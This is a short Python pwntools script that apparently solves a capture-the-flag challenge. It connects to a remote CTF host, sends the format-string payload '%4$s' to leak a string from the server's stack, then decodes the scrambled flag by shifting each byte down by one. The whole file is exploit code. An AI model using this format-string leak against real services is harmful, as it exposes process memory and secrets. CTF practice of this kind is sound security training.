from pwn import *

def leak_flag():
   p = remote('printfailed.sdc.tf',1337,level='error')
   p.sendline(b"%4$s")
   p.recvuntil(b'you guessed:')
   p.recvline()
   resp=p.recvline().strip(b'\n')
   return resp

def unscramble(resp):
   flag=''
   for i in resp:
      flag+=chr(i-1)
   print(flag) 

resp=leak_flag()
unscramble(resp)
